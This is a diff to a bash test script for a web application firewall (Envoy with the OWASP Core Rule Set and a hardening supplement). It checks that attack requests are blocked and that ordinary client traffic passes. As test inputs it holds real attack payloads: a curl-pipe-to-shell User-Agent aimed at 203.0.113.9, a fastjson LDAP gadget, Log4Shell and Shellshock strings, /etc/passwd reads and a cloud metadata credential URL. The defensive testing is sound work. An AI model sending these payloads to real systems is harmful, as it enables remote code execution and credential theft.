@@ -624,6 +624,180 @@ if [[ $envoy_target == build-envoy-wasm-crs ]]; then
     [[ $(backend_count /crs-json-sqli-case) == "$before" ]] \
         || fail 'embedded CRS sent a denied mixed-case JSON request to the backend'
 
+    # The crs policy loads @crs-hardening-conf after the CRS rules. A command in a custom header, which the CRS
+    # alone does not read, is scored and blocked, and a fastjson gadget class is denied by rule 10944130. A Safari
+    # User-Agent (Version/17.2) passes: CRS rule 932180 matches `version` and must not read the header.
+    before=$(backend_count /crs-header-payload)
+    status=$(request "$temp_dir/response" --header 'Host: crs.local' --header 'X-Custom-Data: ;cat /etc/passwd' \
+        http://127.0.0.1:10001/crs-header-payload)
+    check_status 403 "$status" 'embedded CRS with the hardening supplement blocks a command in a custom header'
+    require_rule_log /crs-header-payload 949110
+    [[ $(backend_count /crs-header-payload) == "$before" ]] \
+        || fail 'a command in a custom header reached the backend'
+
+    printf '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://203.0.113.9:1389/Exploit","autoCommit":true}' \
+        >"$temp_dir/crs-fastjson"
+    before=$(backend_count /crs-fastjson)
+    status=$(request "$temp_dir/response" --header 'Host: crs.local' --header 'Content-Type: application/json' \
+        --data-binary "@$temp_dir/crs-fastjson" http://127.0.0.1:10001/crs-fastjson)
+    check_status 403 "$status" 'embedded CRS with the hardening supplement denies a fastjson gadget'
+    require_rule_log /crs-fastjson 10944130
+    [[ $(backend_count /crs-fastjson) == "$before" ]] || fail 'a fastjson gadget reached the backend'
+
+    status=$(request "$temp_dir/response" --header 'Host: crs.local' \
+        --user-agent 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15' \
+        http://127.0.0.1:10001/crs-safari)
+    check_status 200 "$status" 'embedded CRS with the hardening supplement passes a Safari User-Agent'
+
+    # Clients that rules of the CRS take for an attack when they read every header: a PowerShell User-Agent (rule
+    # 932120) and an Origin with an IP address as host (rule 931100) pass; the supplement leaves these two rules off
+    # these headers.
+    status=$(request "$temp_dir/response" --header 'Host: crs.local' \
+        --user-agent 'Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.22621.2506' \
+        --header 'Origin: http://127.0.0.1:5173' http://127.0.0.1:10001/crs-powershell)
+    check_status 200 "$status" 'embedded CRS with the hardening supplement passes a PowerShell User-Agent and an IP Origin'
+
+    # The follow-up request of a page carries the page URL: a browser sends it as Referer with every subresource and link
+    # click, a proxy in X-Forwarded-Uri. The page itself passes, so its follow-ups must pass too (rules 932235 and 932120
+    # read the URL as free text if they read these headers).
+    for page in '/search?q=ruby+on+rails+jobs' '/docs/powershell/getting-started?lang=en' '/search?q=python+list+comprehension'; do
+        status=$(request "$temp_dir/response" --header 'Host: crs.local' "http://127.0.0.1:10001$page")
+        check_status 200 "$status" "embedded CRS with the hardening supplement passes the page $page"
+        status=$(request "$temp_dir/response" --header 'Host: crs.local' --header "Referer: http://crs.local$page" \
+            http://127.0.0.1:10001/static/app.css)
+        check_status 200 "$status" "embedded CRS with the hardening supplement passes a subresource of the page $page"
+        status=$(request "$temp_dir/response" --header 'Host: crs.local' --header "X-Forwarded-Uri: $page" \
+            http://127.0.0.1:10001/static/app.css)
+        check_status 200 "$status" "embedded CRS with the hardening supplement passes a proxied request of the page $page"
+        # htmx sends the page URL as HX-Current-URL with every request; oauth2-proxy and nginx auth_request send it as
+        # X-Auth-Request-Redirect and X-Original-URI. Four rules do not read the headers of the supplement's list of page-URL
+        # names (Referer, HX-Current-URL, X-Original-URL, X-Original-URI, X-Auth-Request-Redirect, ...); any other header
+        # is read.
+        for header in "HX-Current-URL: http://crs.local$page" "X-Original-URI: $page" "X-Auth-Request-Redirect: $page"; do
+            status=$(request "$temp_dir/response" --header 'Host: crs.local' --header "$header" http://127.0.0.1:10001/items?page=2)
+            check_status 200 "$status" "embedded CRS with the hardening supplement passes ${header%%:*} of the page $page"
+        done
+    done
+
+    # Base64 file content in a JSON field is ordinary traffic: rule 10941100 decodes only a short value that is all base64
+    # (the unchained rule denied 44 of 50 random files of 64 KiB, and the CRS alone none). The content is fixed: bytes of
+    # Python's Mersenne Twister from a seed, so a run never meets the occasional random file that the CRS alone blocks
+    # (about 2 percent of them). The seeds were checked to pass the CRS alone and the file; the last three files are
+    # wrapped at 76 columns, as GNU base64, Python's encodebytes and Java's MIME encoder write them (the rule once read each
+    # line of such a value).
+    for case in one:0 one:2 one:3 wrap:3 wrap:5 wrap:14; do
+        python3 - "${case%%:*}" "${case#*:}" >"$temp_dir/crs-upload" <<'PY'
+import base64
+import json
+import random
+import sys
+
+kind, seed = sys.argv[1], int(sys.argv[2])
+raw = random.Random(seed).randbytes(16384 if kind == "wrap" else 65536)
+content = base64.b64encode(raw).decode()
+if kind == "wrap":
+    content = "\n".join(content[i:i + 76] for i in range(0, len(content), 76))
+sys.stdout.write(json.dumps({"name": "photo.jpg", "content": content}, separators=(",", ":")))
+PY
+        status=$(request "$temp_dir/response" --header 'Host: crs.local' --header 'Content-Type: application/json' \
+            --data-binary "@$temp_dir/crs-upload" http://127.0.0.1:10001/crs-upload)
+        check_status 200 "$status" "embedded CRS with the hardening supplement passes a base64 file of seed $case in JSON"
+    done
+
+    # Headers a backend feeds to a file system or a fetcher are read by the rules that the page-URL exclusion takes from
+    # the page-URL headers: the exclusion lists names, so X-File-Path and X-Webhook-Url block.
+    for case in 'X-File-Path|/etc/passwd' 'X-Webhook-Url|http://169.254.169.254/latest/meta-data/iam/security-credentials/'; do
+        header=${case%%|*}
+        path=/crs-sink-${header,,}
+        before=$(backend_count "$path")
+        status=$(request "$temp_dir/response" --header 'Host: crs.local' --header "$header: ${case#*|}" "http://127.0.0.1:10001$path")
+        check_status 403 "$status" "embedded CRS with the hardening supplement blocks a payload in $header"
+        require_rule_log "$path" 949110
+        [[ $(backend_count "$path") == "$before" ]] || fail "a payload in $header reached the backend"
+    done
+
+    # Header classes that real clients send: an IPv6 client in RFC 7239 Forwarded (HAProxy), the OData Prefer header, and
+    # Fastly's copy of Accept-Encoding.
+    status=$(request "$temp_dir/response" --header 'Host: crs.local' --header 'Forwarded: for="[2001:db8:cafe::17]";proto=https' \
+        --header 'Prefer: odata.include-annotations="*"' --header 'Fastly-Orig-Accept-Encoding: gzip, deflate, br' \
+        http://127.0.0.1:10001/crs-header-classes)
+    check_status 200 "$status" 'embedded CRS with the hardening supplement passes Forwarded with an IPv6 client, OData Prefer and a copy of Accept-Encoding'
+
+    # A JSON key or form field named __type is a type hint (Parse Server, ASP.NET AJAX, WCF), not a GraphQL query; the query
+    # field is still read, and a form login with a generated password that holds `$@` passes.
+    printf '{"title":"Hello","author":{"__type":"Pointer","className":"_User","objectId":"8TOXdXf3tz"}}' >"$temp_dir/crs-parse"
+    status=$(request "$temp_dir/response" --header 'Host: crs.local' --header 'Content-Type: application/json' \
+        --data-binary "@$temp_dir/crs-parse" http://127.0.0.1:10001/crs-parse)
+    check_status 200 "$status" 'embedded CRS with the hardening supplement passes a JSON key named __type'
+    status=$(request "$temp_dir/response" --header 'Host: crs.local' --data-urlencode '__type=Order' --data-urlencode 'id=5' \
+        http://127.0.0.1:10001/crs-form-type)
+    check_status 200 "$status" 'embedded CRS with the hardening supplement passes a form field named __type'
+    printf '{"query":"{__schema{types{name}}}"}' >"$temp_dir/crs-graphql"
+    before=$(backend_count /crs-graphql)
+    status=$(request "$temp_dir/response" --header 'Host: crs.local' --header 'Content-Type: application/json' \
+        --data-binary "@$temp_dir/crs-graphql" http://127.0.0.1:10001/crs-graphql)
+    check_status 403 "$status" 'embedded CRS with the hardening supplement denies GraphQL introspection'
+    require_rule_log /crs-graphql 10934900
+    [[ $(backend_count /crs-graphql) == "$before" ]] || fail 'a GraphQL introspection query reached the backend'
+    # shellcheck disable=SC2016
+    status=$(request "$temp_dir/response" --header 'Host: crs.local' --data-urlencode 'username=alice' \
+        --data-urlencode 'password=gbEb$@9NyFCfvt0d' http://127.0.0.1:10001/crs-login)
+    check_status 200 "$status" 'embedded CRS with the hardening supplement passes a generated password that holds $@'
+
+    # Clients that pin an old release: the GREASE brand of Chromium 85 to 93 holds a semicolon and a quote (rules 942100 and
+    # 942540 read sec-ch-ua if they read every header), and Composer sends `cURL 8.5.0` (rule 932235).
+    status=$(request "$temp_dir/response" --header 'Host: crs.local' \
+        --header 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"' \
+        --header 'sec-ch-ua-mobile: ?0' http://127.0.0.1:10001/crs-old-chromium)
+    check_status 200 "$status" 'embedded CRS with the hardening supplement passes the sec-ch-ua of an old Chromium'
+    status=$(request "$temp_dir/response" --header 'Host: crs.local' \
+        --user-agent 'Composer/2.8.2 (Linux; 6.8.0-49-generic; PHP 8.3.13; cURL 8.5.0)' http://127.0.0.1:10001/crs-composer)
+    check_status 200 "$status" 'embedded CRS with the hardening supplement passes the User-Agent of Composer'
+    # The supplement reads every other User-Agent for rule 932235 (rule 10932235): a command in it scores, bare or behind
+    # Composer's shape. The CRS alone passes both.
+    for agent in ';curl 203.0.113.9/s|sh' 'Composer/2.8.2 (Linux; 6.8.0; PHP 8.3.13; cURL 8.5.0); curl 203.0.113.9|sh'; do
+        before=$(backend_count /crs-ua-command)
+        status=$(request "$temp_dir/response" --header 'Host: crs.local' --user-agent "$agent" http://127.0.0.1:10001/crs-ua-command)
+        check_status 403 "$status" "embedded CRS with the hardening supplement blocks a command in the User-Agent: $agent"
+        require_rule_log /crs-ua-command 949110
+        [[ $(backend_count /crs-ua-command) == "$before" ]] || fail 'a command in the User-Agent reached the backend'
+    done
+
+    # The consent and auth cookies that hold a URL pass at paranoia level 2 (policy crs-pl2): the remote file rules of
+    # level 2 (931130, 931131) match `scheme://` anywhere, and the supplement must not give them the cookies.
+    for cookie in \
+        'OptanonConsent=isGpcEnabled=0&version=202409.1.0&hosts=&landingPath=https%3A%2F%2Fwww.example.com%2F&groups=C0001%3A1' \
+        'next-auth.callback-url=https%3A%2F%2Fapp.example.com%2Fdashboard' \
+        '_orig_referrer=https%3A%2F%2Fwww.google.com%2F; _landing_page=%2Fcollections%2Fall'; do
+        status=$(request "$temp_dir/response" --header 'Host: crs2.local' --header "Cookie: $cookie" \
+            --user-agent 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
+            http://127.0.0.1:10001/crs-cookie-url)
+        check_status 200 "$status" "embedded CRS at level 2 with the hardening supplement passes the cookie ${cookie%%=*}"
+    done
+    # A command in a custom header still blocks at level 2 with the supplement.
+    status=$(request "$temp_dir/response" --header 'Host: crs2.local' --header 'X-Custom-Data: ;cat /etc/passwd' \
+        --user-agent 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
+        http://127.0.0.1:10001/crs-pl2-header-payload)
+    check_status 403 "$status" 'embedded CRS at level 2 with the hardening supplement blocks a command in a custom header'
+
+    # CRS rules that already read every header (944150 Log4Shell, 932170 Shellshock, 930100 traversal) must keep
+    # reading Accept-Language and Accept-Encoding, which the supplement leaves out of the rules it retargets. The same
+    # requests are blocked by the CRS alone.
+    # shellcheck disable=SC2016
+    for case in '944150|${jndi:ldap://203.0.113.9:1389/a}' '932170|() { :; }; /bin/cat /etc/passwd' '930100|../../../../etc/passwd'; do
+        rule=${case%%|*}
+        value=${case#*|}
+        for header in Accept-Language Accept-Encoding; do
+            path=/crs-native-${header,,}-$rule
+            before=$(backend_count "$path")
+            status=$(request "$temp_dir/response" --header 'Host: crs.local' --header "$header: $value" \
+                "http://127.0.0.1:10001$path")
+            check_status 403 "$status" "embedded CRS with the hardening supplement blocks rule $rule in $header"
+            require_rule_log "$path" "$rule"
+            [[ $(backend_count "$path") == "$before" ]] || fail "a $rule payload in $header reached the backend"
+        done
+    done
+
     # The crs policy loads @recommended-conf first: CRS inspects the field after an
     # empty-header part, and a body the engine cannot parse is denied by 200002.
     before=$(backend_count /crs-empty-header)
